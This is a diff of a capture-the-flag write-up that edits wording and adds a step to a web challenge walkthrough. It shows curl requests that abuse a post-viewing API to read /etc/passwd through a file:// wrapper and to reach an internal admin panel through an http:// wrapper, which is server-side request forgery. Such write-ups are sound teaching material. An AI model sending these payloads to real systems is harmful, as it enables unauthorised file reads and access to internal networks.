@@ -34,16 +34,23 @@ And the parameter passed is this
 
 It is using a `file` wrapper to view the content of `/posts/Azita`
 
-With this we can basically read local file off disk 
+With this we can basically read local files from disk 
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b6cb54c6-7e8a-4353-90e3-7ea3a536c427)
 
 ```r
 curl -s -X POST "https://ecorpblog.uctf.ir/api/view.php" -H "Content-Type: application/json" -d '{"post":"file:///etc/passwd"}' | jq .post -r
 ```
 
-But would that help us in accessing the internal domain
+But how would that help us in accessing the internal domain?
 
 Well since it uses `file` wrapper it's safe to assume we can also make use of other wrappers in this case it will be `http`
 
 With that said we should be able to access the internal domain `http://admin-panel.local`
+
+Doing that works!
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ca1ad5f7-096d-4067-8b3d-08669c628713)
+
+```r
+curl -s -X POST "https://ecorpblog.uctf.ir/api/view.php" -H "Content-Type: application/json" -d '{"post":"http://admin-panel.local"}' | jq .post -r
+```
 
